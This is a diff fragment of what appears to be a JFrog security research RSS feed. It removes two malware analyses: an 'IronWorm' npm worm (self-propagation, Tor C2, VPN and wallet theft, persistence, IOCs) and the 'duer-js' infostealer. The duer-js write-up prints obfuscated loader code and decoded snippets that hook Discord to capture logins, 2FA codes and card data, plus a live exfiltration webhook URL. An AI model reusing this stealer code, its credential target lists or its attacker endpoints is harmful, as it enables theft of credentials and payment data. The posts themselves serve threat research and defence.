-When the installer runs, the JavaScript loader checks the host operating system using `process.platform`. It selects the corresponding slice of the CSI container, decompresses it via gzip, writes the binary to a hidden temporary path, and executes it as a detached background process.
-
-<div align="center">
-
-![CSI loader JavaScript](/img/RealTimePostImage/post/ironworm/decomp-1.png)
-
-</div>
-
-## Automated npm self-propagation
-
-While the previous variant contained logic for credential theft and potential commit forging, our analysis of the new Linux payload confirms an end-to-end, fully automated npm propagation routine.
-
-Unlike the first variant, which attempted to exchange OIDC identity tokens for Trusted Publishing, this variant goes back to basics but automates it completely. It performs the following steps without needing any local npm command line tools:
-
-1. **Collects npm credentials:** It scans environment variables and files on disk for `NPM_TOKEN`, `NODE_AUTH_TOKEN`, `NPM_CONFIG__AUTHTOKEN`, `NPM_CONFIG_TOKEN`, `NPM_AUTH_TOKEN`, `.npmrc`, `/etc/npmrc`, and `_authToken=`.
-2. **Validates credentials:** It queries `registry.npmjs.org/-/whoami` to verify the token, then lists organizations and packages using `/-/orgs` and `/-/v1/user/<user>/packages`.
-3. **Selects popular targets:** It queries `api.npmjs.org/downloads/point/last-month` to prioritize packages with higher download counts.
-4. **Downloads and infects:** It retrieves the latest `.tgz` archive of the target package, unpacks it, adds a malicious `setup.mjs` script, and rewrites `package.json` to trigger `node setup.mjs` via `scripts.preinstall`.
-5. **Direct registry publication:** Instead of executing `npm publish`, the native payload builds the necessary publication metadata JSON and uploads it directly to `registry.npmjs.org` using a raw HTTP `PUT` request on port 443 with the stolen bearer token.
-
-<div align="center">
-
-![npm registry PUT decompilation](/img/RealTimePostImage/post/ironworm/decomp-2.png)
-
-</div>
-
-## Expanded target set: VPNs, offensive tools, and password managers
-
-The original campaign swept for developer environment keys, cloud credentials, and cryptocurrency wallets (specifically Exodus). The new variant has heavily expanded its targets.
-
-### Active browser-extension wallet theft
-Instead of relying solely on modifying the local desktop Exodus application, the malware uses its unique per-site string encryption to target browser extensions. The encryption routine uses ChaCha20-Poly1305 with a distinct 32-byte key and 12-byte nonce for every single string call site. Decrypting these strings reveals targets such as MetaMask (`nkbihfbeogaeaoehlefnkodbefgpgknn`) and Trust Wallet (`egjidjbpglichdcondbcbdnbeeppgdph`).
-
-<div align="center">
-
-![Wallet target decryption](/img/RealTimePostImage/post/ironworm/decomp-3.png)
-
-</div>
-
-### VPN and network credentials
-The malware now searches for and exfiltrates WireGuard configuration files (`/etc/wireguard/*.conf`), OpenVPN configurations (`/etc/openvpn`), IPsec secrets (`/etc/ipsec.secrets`), strongSwan configurations, and PPP CHAP/PAP credentials.
-
-### Evolved Tor command and control (C2)
-While the previous variant utilized simple HTTP-based Tor communication, our analysis of the new Linux payload reveals a significantly more sophisticated Tor transport and exfiltration mechanism.
-
-#### Local Tor Expert Bundle management
-When launched, the malware dynamically acquires and manages its own Tor network path rather than relying on a pre-installed client:
-1. It probes localhost to find an open SOCKS port.
-2. If none is available, it connects directly to `archive.torproject.org:443` to download the official Tor Expert Bundle archive (`tor-expert-bundle-<platform>-16.0a7.tar.gz`), extracting the binary and its dependent libraries (`libcrypto.so.3`, `libssl.so.3`, and `libevent`).
-3. It generates a local `.torrc` configuration setting `RunAsDaemon 0`. It launches Tor as a foreground child process, monitoring its standard error until it reads the `Bootstrapped 100%` success signal.
-
-#### Direct SOCKS5 CONNECT negotiation
-To route traffic, the native payload negotiates SOCKS5 handshake requests directly at the socket level. It connects to the local Tor SOCKS proxy and performs authentication negotiation (`05 01 00` requiring a `05 00` no-authentication response) followed by a domain CONNECT request. This instructs Tor to perform the destination DNS resolution directly, concealing the lookup from the host system.
-
-#### Multi-route C2 transport
-The malware supports two distinct Tor-carried communication routes:
-* **HTTP Bootstrap (Route 1):** SOCKS connects to the destination C2 hostname on port 80, followed by a `POST / HTTP/1.0` request containing the 32-byte client public key. Unlike the original IronWorm's `/api/agent` path, this HTTP wrapper has been simplified to use the root `/` path.
-* **Raw Stream (Route 2):** Alternatively, the malware negotiates SOCKS to the destination on port 8080, bypassing HTTP headers entirely to communicate over a raw, structured TCP channel.
-
-#### Layered stream cryptography (X25519 & ChaCha20-Poly1305)
-The communication channel uses layered, application-level encryption inside the Tor stream:
-
-1. **X25519 Public Key Exchange:** The client generates 32 random bytes, clamps them as an X25519 private scalar, and derives its public key. It sends this public key during the bootstrap phase. It decrypts an embedded server public key (`x25519_server_pub`) stored securely in its configuration, so no server public key needs to be exchanged over the wire.
-2. **Directional HKDF Expansion:** The resulting shared secret is expanded into separate client-to-server (`csi-a2s`, `hkdf a2s`) and server-to-client (`csi-s2a`, `hkdf s2a`) key spaces, preventing key reuse.
-3. **ChaCha20-Poly1305 Framing:** Every message is framed with a 4-byte big-endian length, a 12-byte nonce, and a ChaCha20-Poly1305 authenticated ciphertext payload.
-
-Once the encrypted handshaking loop completes, the malware sends an encrypted `hello` JSON payload detailing CPU cores, system locale, active users, and environment info, then enters a loop supporting remote liveness pings, command execution (via `bash`, `python3`, powershell, and `cmd`), and remote command cancellation.
-
-<div align="center">
-
-![SOCKS5 CONNECT and key exchange](/img/RealTimePostImage/post/ironworm/decomp-4.png)
-
-</div>
-
-#### The dual-path exfiltration blunder
-The malware's exfiltration strategy uses a dual-path architecture that is as clever as it is self-defeating. 
-
-For control, commands, and metadata, the implant sticks to the encrypted Tor SOCKS5 channel. The initial system fingerprint, sent as an encrypted `t=hello` packet, contains everything from the hardware ID and active user to the CPU core count, system locale, and local SOCKS port.
-
-But when it comes to bulk exfiltration, the malware authors made a massive opsec blunder. 
-
-Instead of routing large file uploads, source trees, or harvested credential databases through the slow Tor network, the malware bypasses the proxy entirely. It uses the `rustls` library to open a direct, unproxied HTTPS connection to `temp.sh`, a public file-sharing service. It uploads the stolen data using a standard multipart/form-data `POST` request. Once the upload finishes, the malware parses the response for the resulting `https://` URL and transmits that link back to the operator over the Tor C2 stream.
-
-This design has two major implications:
-* **Real IP exposure:** The query to `check.torproject.org/api/ip` to obtain the victim's public IP (which is included in the encrypted `hello` packet) is made directly over TLS, leaking the victim's real, unproxied IP address to the Tor Project's infrastructure before C2 communication even starts.
-* **Network visibility:** Any network monitor or firewall will see the bulk data transfer going straight to a public file host over direct TLS, completely defeating the anonymity of using Tor for the command channel.
-
-Staging stolen data on a public file host also means the operator does not have to host or scale their own storage infrastructure. However, it also means the victim's sensitive secrets are left on a third-party service where they might be exposed if the generated URLs are guessed or the host's logs are audited.
-
-### Tor hidden-service keys
-Separately from launching its own Tor client for C2 communication, the malware now scans the host for Tor configuration files and actively steals private keys associated with third-party onion services. This includes files such as `hs_ed25519_secret_key`, `hs_ed25519_public_key`, and `private_key_ed25519`.
-
-### Offensive-security infrastructure
-In a highly targeted move, the implant searches for local installations and configuration folders of popular red-team and C2 frameworks, including Metasploit, Sliver, Havoc, Mythic, Covenant, AdaptixC2, and Shad0w. This suggests the threat actors are intentionally targeting the workstations of security researchers, penetration testers, and operators.
-
-### Password managers and local key-stores
-The credential scanner now collects local vaults for 1Password and Bitwarden. On Linux systems, it actively queries the KDE Wallet service over D-Bus (`org.kde.KWallet`) and executes `kwallet-query --read-password` to extract passwords directly from the system keyring.
-
-## Broad cross-platform persistence
-
-The previous variant only used basic systemd user services to maintain persistence on Linux systems. The new codebase contains a dedicated, cross-platform persistence engine that deploys different mechanisms depending on the host:
-
-* **Linux:** It attempts to install a systemd system service under `/etc/systemd/system` with `Restart=always`, reloading the daemon and starting it immediately. If that fails, it falls back to a user-level systemd unit under `~/.config/systemd/user` or traditional cron jobs (`/etc/cron.d` or user crontab).
-* **macOS:** It deploys LaunchAgents and LaunchDaemons plist files to ensure execution across user sessions and system boots.
-* **Windows:** It writes its payload directly into the user's Startup folder (`AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup`).
-
-## Remediation guidance
-
-If your environment has installed any of the compromised `jscrambler` versions, you must assume your system is compromised and all local credentials are compromised.
-
-### Step 1: Containment
-Cut off the malware's ability to propagate or exfiltrate:
-* **Revoke and rotate ALL secrets and credentials** that were present on the infected host. This includes AWS, Kubernetes, Docker, database, and SSH keys.
-* **Revoke all npm tokens** immediately. Check your npm account's publishing history for unauthorized package versions.
-* Block outgoing connections to the observed C2 IP addresses (`37.27.122.124` and `57.128.246.79`) and Tor onion-routing nodes.
-
-### Step 2: Eradication of persistence
-Depending on your platform, locate and remove the persistence hooks.
-
-On Linux:
-```shell
-# Check and stop systemd services
-systemctl stop malicious-service-name.service
-systemctl disable malicious-service-name.service
-rm -f /etc/systemd/system/malicious-service-name.service
-systemctl daemon-reload
-
-# Check user-level systemd services
-systemctl --user stop pgmon.service
-systemctl --user disable pgmon.service
-rm -f ~/.config/systemd/user/pgmon.service
-systemctl --user daemon-reload
-
-# Check cron jobs
-crontab -r
-rm -f /etc/cron.d/malicious-job
-```
-
-On macOS:
-Identify and delete any unrecognized plist files under:
-* `~/Library/LaunchAgents/`
-* `/Library/LaunchAgents/`
-* `/Library/LaunchDaemons/`
-
-On Windows:
-Check the startup folder and delete any unrecognized executable or shortcut:
-* `C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`
-
-### Step 3: Package cleanup and dependency locking
-Purge the compromised `jscrambler` versions from your projects:
-```shell
-# Remove node_modules and clean npm cache
-rm -rf node_modules
-npm cache clean --force
-
-# Force downgrade or update to a clean version (8.21.0 or newer)
-# Avoid the infected range: 8.14.0, 8.16.0, 8.17.0, 8.18.0, 8.20.0
-npm install jscrambler@latest
-```
-
-## Known malicious packages
-
-Through our continuous monitoring and threat intelligence pipeline, we have identified the following compromised package versions containing the IronWorm Rust implant:
-
-| Package Name | Malicious Versions | Xray ID |
-| :---- | :---- | :---- |
-| `jscrambler` | 8.14.0, 8.16.0, 8.17.0, 8.18.0, 8.20.0 | XRAY-1025905 |
-
-## Conclusions
-
-The evolution of IronWorm into a highly automated, cross-platform threat shows how rapidly modern software supply chain actors are maturing. Transitioning from a single Linux target with standard UPX to a custom three-platform CSI container demonstrates both capability and intent to strike developers regardless of their local operating system.
-
-The automation of the npm propagation pipeline (by writing infected tarballs and uploading them using direct raw HTTP PUT requests) bypasses standard local CLI guardrails and accelerates the infection cycle. Security teams must monitor not just package configuration files, but active network activity originating from local install scripts and build machines.
-
-JFrog Curation customers are protected, as the malicious package versions have been blocked. We will continue monitoring the campaign and updating our intelligence feeds as new variants emerge.
-
-## Indicators of Compromise (IOCs)
-
-### Payloads
-
-| SHA-256 | Description |
-| :---- | :---- |
-| `a41a523ef9517aab37ed6eea0ec881821bdcb7aefcb5c5f603adc7907f868c86` | Malicious `index.js` file (the `jscrambler` CSI container) |
-| `fbbcf4d8f98168f78f5c0c47a9ae56d59ec8ac84a7c9ca6b797fedfb8d62d2bd` | Linux x86-64 payload |
-| `b7ca95d1b23c8e67416a25cedf741de0917c2096bbc9d24649eea7853d054903` | Windows x86-64 payload |
-| `c8fd47d36bdf7c825378593ab82ed8c24d1dc52e26b507812393e24e1d5201fd` | macOS arm64 payload |
-
-### Network indicators
-
-* `37.27.122.124` (C2 / upload destination)
-* `57.128.246.79` (C2 / upload destination)
-* `archive.torproject.org` (Tor bundle checks)
-* `check.torproject.org` (Tor loop verification)
-
-### Package indicators
-
-* `package/dist/intro.js`
-* `package/dist/setup.js`
-* `setup.mjs`
 ]]></content:encoded>
         </item>
         <item>
@@ -14114,271 +14273,6 @@ This package is already detected by JFrog Xray and JFrog Curation, under the Xra
 | Linux Binary URL | hxxps\[://\]x-ya\[.\]ru/FvXnR/node-exporter  |
 | Linux Payload Source | hxxps\[://\]functions\[.\]yandexcloud\[.\]net/d4elc6rmqc9fbfsd7m2s?id=3  |
 
-]]></content:encoded>
-        </item>
-        <item>
-            <title><![CDATA[How a Complex Multi Payload Infostealer Hid in NPM Disguised as 'Console Visibility']]></title>
-            <link>https://research.jfrog.com/post/duer-js-malicious-package/</link>
-            <guid>https://research.jfrog.com/post/duer-js-malicious-package/</guid>
-            <pubDate>Wed, 11 Feb 2026 00:00:00 GMT</pubDate>
-            <description><![CDATA[The JFrog security research team recently uncovered a sophisticated malicious package called "duer-js" published on NPM by the user "luizaearlyx". After complex analysis, the package was identified as an advanced windows targeted information stealer, self-named as “bada stealer”. The package remains active as of this publication.]]></description>
-            <content:encoded><![CDATA[
-The JFrog security research team recently uncovered a sophisticated malicious package called `duer-js` published on NPM by the user `luizaearlyx`. After complex analysis, the package was identified as an advanced windows targeted information stealer, self-named as **“bada stealer”**. The package remains active as of this publication.
-
-![](/img/RealTimePostImage/post/duer-js-package/image1.png)
-
-In addition to stealing information from the host it infected, the malicious package downloads a secondary payload. This payload is designed to run on Discord Desktop app startup, with self updating capabilities, stealing directly from it, including payment methods used by the user.
-
-The solution of **simply uninstalling the package is not enough in this case**. In this article we dive into the obfuscation methods and a detailed analysis of the malicious package, including remediation steps for compromised endpoints.
-
-## String Decoding Walk-Through
-
-![](/img/RealTimePostImage/post/duer-js-package/image2.png)  
-*Strings decoding process in the package stages*
-
-The package lists `index.js` as the main, when inspecting it (pretty printed) we immediately noticed a very long line wrapped in `eval()`, with length of almost 64 thousand characters. 
-
-```javascript
-//Make console version more visible :: By Luisa | Other Version code is on GitHub
-let fx4sb;
-!function() {
-    const var_12 = Array.prototype.slice.call(arguments);
-    return eval("(function sykF(bOrx){const Dlux=nVyv(bOrx,Ddmv(sykF.toString()))....%19%1A%09AWX%17%14E\")");
-}();
-const whPE = require(fx4sb.zMOqb(0));
-const YiSE = require(fx4sb.ruwob(1));
-const YCFF = require(fx4sb.HMjob(2));
-const AEIF = require(fx4sb.HMjob(2));
-const UzzF = require(fx4sb.DJLob(3));
-const wBCF = require(fx4sb.vB8ob(4));
-const QwtF = require(fx4sb.nrYob(5));
-const { [fx4sb.LVspb(6)]: sywF, [fx4sb.joqpb(7)]: MtnF } = require(fx4sb.zMOqb(8));
-...
-```
-
-*Pretty printed code snippet from index.js entry point*
-
-Extracting and pretty printing the string from the long line immediately revealed that the code has anti-tempering protection in place for the enthusiastic researchers who might modify and run it. Researchers must bypass or disable the anti-tempering in order to run the malicious code, which is exactly what the attacker wants, higher complexity for analysis:
-
-```javascript
-const Dlux = nVyv(bOrx, Ddmv(sykF.toString()));
-console.log(Dlux);
-try {
-    let fLov = eval(Dlux);
-    return fLov.apply(null, YUFk);
-} catch (Hirv) {
-    var bGjv = (0o202354 - 66782);
-    while (bGjv < (0o400140 % 65566)) switch (bGjv) {
-        case (0x3005F % 0o200033):
-            bGjv = Hirv instanceof SyntaxError ? (0o400103 % 0x1001B) : (0o400142 % 0x1001F);
-            break;
-        case (0o200606 - 0x10179):
-            bGjv = (0o400156 % 65573);
-            {
-                console.log('Error: the code has been tampered!');
-                return
-            }
-            break;
-    }
-    throw Hirv;
-}
-```
-
-At the end of the long line we found a URI-encoded string, which is passed as an argument to subsequent functions, the decoded string then undergoes an XOR mechanism with a key that is evaluated at run time. 
-
-After initial decoding, another evaluation is performed on the decoded value, which is yet again URI-encoded and XORed. However, this time it contains an array with highly unique values:  
-![](/img/RealTimePostImage/post/duer-js-package/image3.png)  
-*Raw conversion table as seen in the second stage of decoding strings*
-
-This array is the string table that is hidden under the layers of obfuscation. The second payload is decoding the entire array with XOR key `11`, giving us the strings conversion table used in the original `index.js`.  A simple replacement of functions that resolve the strings, with their actual value, yielded a version of the malware, very close to the original source code.
-
-![](/img/RealTimePostImage/post/duer-js-package/image4.png)  
-*Comparison of payload before and after resolving strings*
-
-## Initial Payload analysis
-
-The malware kills browsers and telegram processes before proceeding to information stealing, the following information is exfiltrated:
-
-1. Discord  
-* Tokens from Discord installs (Local Storage / leveldb) under `%APPDATA%` and `%LOCALAPPDATA%` (discord, discordcanary, discordptb, discorddevelopment, lightcord).  
-* Per-token: user info (`/users/@me`), Nitro type, billing/payment sources (`/billing/payment-sources`), friends, guilds, 2FA backup codes (searches for `discord_backup_codes` in user dirs and exfiltrates them).  
-2. Browsers (Chrome, Edge, Brave, Opera, Yandex)  
-* Passwords from `passwords.db` / Login Data (decrypted via DPAPI where used).  
-* Cookies from `Network\Cookies` and `Network\LxnyCookies`.  
-* Autofill / credit cards from Web Data (e.g. `name_on_card`, `card_number_encrypted`, `expiration_month/year`).  
-* Paths cover Default \+ Profile 1–5 \+ Guest for each browser; also “Wallets” cookie dirs and extension data for multiple crypto wallets (Exodus, BraveWallet, MetaMask-style, etc.).  
-3. Crypto wallets  
-* Exodus: zips `%APPDATA%\Exodus\exodus.wallet` and uploads as `Exodus.zip`.  
-* Many browser-extension wallets are listed by name (BraveWallet, AtomicWallet, etc.) via their Local/Sync Extension Settings paths.  
-4. Other  
-* Steam: zips `C:\Program Files (x86)\Steam\config` and uploads as `steam.zip`.  
-* System/info: hostname, OS version, uptime, RAM, CPU count, username, temp dir, cwd, IP (from myexternalip.com).
-
-```javascript
-["author"]: { ["name"]: `${process["env"]["USERNAME"]}${" | Browsers Data"}` },
-["fields"]: [
-    {
-        ["name"]: "Cookies",
-        ["value"]: `${"\\`"}${var_474}${"\\`"}`,
-        ["inline"]: true
-    },
-    {
-        ["name"]: "Passwords",
-        ["value"]: `${"\\`"}${var_501}${"\\`"}`,
-        ["inline"]: true
-    },
-    {
-        ["name"]: "Credit Cards",
-        ["value"]: `${"\\`"}${var_515}${"\\`"}`,
-        ["inline"]: true
-    },
-    {
-        ["name"]: "Autofills",
-        ["value"]: `${"\\`"}${var_507}${"\\`"}`,
-        ["inline"]: true
-    },
-    {
-        ["name"]: "Wallets",
-        ["value"]: `${"\\`"}${var_520}${"\\`"}`,
-        ["inline"]: true
-    },
-    {
-        ["name"]: "Steam",
-        ["value"]: `${"\\`"}${var_521}${"\\`"}`,
-        ["inline"]: true
-    },
-    {
-        ["name"]: "\u200b",
-        ["value"]: `${"[Cookies]("}${var_496}${"), [Passwords]("}${var_498}${"), [Credit-Cards]("}${var_512}${"), [AutoFills]("}${var_504}${") "}${var_518}${" "}${var_519}`
-    }
-],
-["footer"]: { ["text"]: "Bada Stealer" }
-};
-
-```
-
-### Data exfiltration and failed persistence attempt
-
-The malware writes `Passwords.txt`, `Cards.txt`, `Autofills.txt` under a “copyright” path, then uploads them; cookies/passwords/credit-cards/autofills (and optional Exodus/Steam links).  
-Data is exfiltrated directly into a discord webhook, with a secondary backup exfiltration method via Gofile server, it gets a server address from `https://api.gofile.io/servers`, then uploads the content into `https://<server>.gofile.io/uploadFile`.
-
-While this is a legitimate service, this method enables the attacker to upload the exfiltrated data to a remote storage, and then retrieve it later. Uploading to a gofile server returns to the user a download url, for later download. The attacker sends that download url to the discord webhook to download later.
-
-Furthermore, the malware **attempts** to get persistence by copying the node.exe executable into `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\<original exe name>`  
-However, since the `node.exe` executable only runs the js file, simply placing it in the startup directory will yield no results, and fail to achieve persistence.
-
-## Second payload analysis \- Hijacking Discord’s Electron environment
-
-![](/img/RealTimePostImage/post/duer-js-package/image5.png)  
-*`duer-js` malicious package flow*
-
-The initial payload downloads a secondary payload from `hxxps[:]//ghostbin[.]axel[.]org/paste/yckfb/raw`, which is yet another js obfuscated in the exact same method as before, with URI-escaping, dynamic evals and XORs.   
-Once again resolving all strings is very similar, and we got a decoded version of the malware:  
-![](/img/RealTimePostImage/post/duer-js-package/image6.png)  
-*Second payload comparison before and after decoding strings*
-
-The original malicious code in `index.js` finds the discord app dirs under `%LOCALAPPDATA%`, then proceeds to overwrite that `index.js` with the fetched payload. So that when the user opens Discord, the injected code runs, and can report “**Successfully Injected**” to the same exfiltration webhook of the first payload.
-
-### What does this payload do? 
-
-The payload's primary purpose is to hijack the **Electron environment** of the Discord desktop application. It achieves this by attaching a debugger to the client's internal web contents to intercept sensitive network traffic as it happens.
-
-The core functionality of the payload is to use the `webContents.debugger` API to hook into Discord's network stack, it listens for `Network.responseReceived` events. And capture by the URL filters:
-
-* `/login`, `/register`: To capture new credentials.  
-* `/mfa/totp`, `/mfa/codes-verification`: To bypass Two-Factor Authentication by capturing verification codes and backup codes in real-time.  
-* `/@me`: To monitor account changes (email or password updates).
-
-```javascript
-mainWindow["webContents"]["debugger"]["attach"]("1.3");
-    mainWindow["webContents"]["debugger"]["on"]("message", async (sicr, Ujfr, ofWq) => {...}
-```
-
-When such an event occurs, it uses `Network.getResponseBody` and `Network.getRequestPostData` to pull the plaintext email, password, and the newly generated session token directly from the memory of the Discord client.
-
-```javascript
-case ofWq["response"]["url"]["endsWith"]("/login"):
-    var Aoor = N0wbb["YiAH"]();
-    while (Aoor < N0wbb["oBnH"]()) switch (Aoor) {
-        case (0x75bcd15 - 0O726746425):
-            Aoor = !kwDr["token"] ? N0wbb["sGsH"]() : N0wbb["oBnH"]();
-            break;
-        case (0O57060516 - 0xbc614d):
-            Aoor = N0wbb["oBnH"](); {
-                YOmu = gtxr["login"];
-                sKdu = gtxr["password"];
-                return;
-            }
-            break;
-    }
-    UfUu(gtxr["login"], gtxr["password"], kwDr["token"], "logged in");
-    break;
-case ofWq["response"]["url"]["endsWith"]("/register"):
-    UfUu(gtxr["email"], gtxr["password"], kwDr["token"], "signed up");
-    break;
-case ofWq["response"]["url"]["endsWith"]("/totp"):
-    UfUu(YOmu, sKdu, kwDr["token"], "logged in with 2FA");
-    break;
-case ofWq["response"]["url"]["endsWith"]("/codes-verification"):
-    kYEu(kwDr["backup_codes"], await gFOz());
-    break;
-case ofWq["response"]["url"]["endsWith"]("/@me"):
-```
-
-The injected payload also attempts to hijack payments, capturing live payments to external services and exfiltrate data of **Credit Card Number, CVC, and Expiry Date** before they are even sent to the legitimate server.  
-All of the data is exfiltrated to the same discord webhook as the first stage of the malicious package.
-
-```javascript
-case YGYr["url"]["endsWith"]("tokens"):
-    const QAMr = Uvwz["parse"](Buffer["from"](YGYr["uploadData"][(0x75bcd15 - 0O726746425)]["bytes"])["toString"]());
-    ovyv(QAMr["card[number]"], QAMr["card[cvc]"], QAMr["card[exp_month]"], QAMr["card[exp_year]"], await gFOz());
-    break;
-case YGYr["url"]["endsWith"]("paypal_accounts"):
-    EHWv(await gFOz());
-    break;
-```
-
-In this payload as well, we see attempts of persistence, with the capability to **self update** based on github repo \- `https[:]//raw[.]githubusercontent[.]com/xSalca/Viral/main/index[.]js`
-
-Observing the repo and it’s files shows a slightly different version, that was created 2 years ago, and updated last year:  
-![](/img/RealTimePostImage/post/duer-js-package/image7.png)
-
-## Remediation
-
-Affected users who installed this package should:
-
-- Uninstall the malicious package `npm uninstall duer-js`  
-- Revoke and rotate stolen secrets  
-  - Browser passwords, cookies, and (from the code) can target crypto wallets (e.g. Exodus) and Steam  
-- Discord autorun removal:  
-  - Close Discord fully  
-  - Uninstall Discord from Windows Settings (or Control Panel)  
-  - Delete the app data folder so the infected file is gone:  
-    - Press \`Win \+ R\`, type `%LOCALAPPDATA%`, Enter.  
-    - Delete the folder(s): Discord, DiscordPTB, DiscordCanary (whichever you had).  
-    - Download and install the official installation  
-- Remove node.exe from startup folder  
-- Assume your discord token was stolen \- invalidate it  
-  - Enable 2FA if you have not already.
-
-## Conclusions
-
-![](/img/RealTimePostImage/post/duer-js-package/image8.png)  
-Although the malicious package has a low download count of only 528, its potential impact on affected individuals is high. With obfuscation, multi payload stages and complex mechanisms to exfiltrate data, it is a bit more unique from the everyday malware we see in NPM.   
-Furthermore, the existence of the repo on Github for more than 2 years, suggests that other attempts of infection may have occurred before we got to the malicious package and traced it back to the repo, leaving us only to wonder \- who is Luisa?
-
-This package is already detected by JFrog Xray and JFrog Curation, under the Xray ID listed in the IoC section below.
-
-## IOC
-
-* `hxxps[:]//discord[.]com/api/webhooks/1455324432548499496/6oMVbi2PYDxrBiOtHe2tpBSUOdBJpz2RDEiwLkHUqeqJbgIPiONHafMP5tHXYjAVK2R3`
-* `hxxps[:]//ghostbin[.]axel[.]org/paste/yckfb/raw`  
-* `https\[:]//raw\[.]githubusercontent\[.]com/xSalca/Viral/main/index[.]js`
-* Github user \- [https://github.com/xSalca/](https://github.com/xSalca/)  
-* Github repo \- [https://github.com/xSalca/Viral](https://github.com/xSalca/Viral)  
-* NPM package \- [`duer-js`](https://www.npmjs.com/package/duer-js?activeTab=code) \- XRAY-938808  
-* NPM user \- `luizaearlyx`  
-* Second payload hash \- a91dd2e6a5ab21b8dd3bac7fc9be928b0764075fa71e33bc5ecd2f237b1f82c3
 ]]></content:encoded>
         </item>
     </channel>
